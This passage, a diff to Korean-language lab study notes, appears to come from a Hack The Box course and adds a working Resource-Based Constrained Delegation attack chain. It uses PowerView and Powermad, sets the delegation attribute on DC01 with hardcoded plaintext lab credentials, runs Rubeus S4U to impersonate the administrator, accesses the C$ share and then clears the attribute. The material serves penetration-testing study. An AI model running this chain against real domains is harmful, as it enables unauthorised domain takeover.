@@ -138,5 +138,75 @@ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
 ```
 
 ## Resource-Based Constrained Delegation
-- 위임 가능 여부를 자원을 가진 쪽(B)이 자기 객체 속성(msDS-AllowedToActOnBehalfOfOtherIdentity)에 "A를 신뢰한다"고 설정하는 방식,
+- 위임 가능 여부를 자원을 가진 쪽(B)이 자기 객체 속성(msDS-AllowedToActOnBehalfOfOtherIdentity)에 "A를 신뢰한다"고 설정하는 방식.
 - Domain Admin 권한 없이도 B에 대한 쓰기 권한만 있으면 수정 가능하다.
+
+### Windows
+```powershell
+# import the PowerView module
+Import-Module C:\Tools\PowerView.ps1
+
+# get all computers in the domain
+$computers = Get-DomainComputer
+
+# get all users in the domain
+$users = Get-DomainUser
+
+# define the required access rights
+$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
+
+# loop through each computer in the domain
+foreach ($computer in $computers) {
+    # get the security descriptor for the computer
+    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
+
+    # loop through each user in the domain
+    foreach ($user in $users) {
+        # check if the user has the required access rights on the computer object
+        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
+
+        if ($hasAccess) {
+            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
+        }
+    }
+}
+```
+```powershell
+Import-Module .\Powermad.ps1
+
+New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
+```
+```powershell
+Import-Module .\PowerView.ps1
+
+$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
+
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+$SD.GetBinaryForm($SDBytes, 0)
+
+$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+
+Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
+```
+```powershell
+.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
+
+.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
+```
+```powershell
+klist
+
+ls \\dc01.inlanefreight.local\c$
+```
+
+#### Clear
+```powershell
+Import-Module .\PowerView.ps1
+
+$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+
+Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
+```
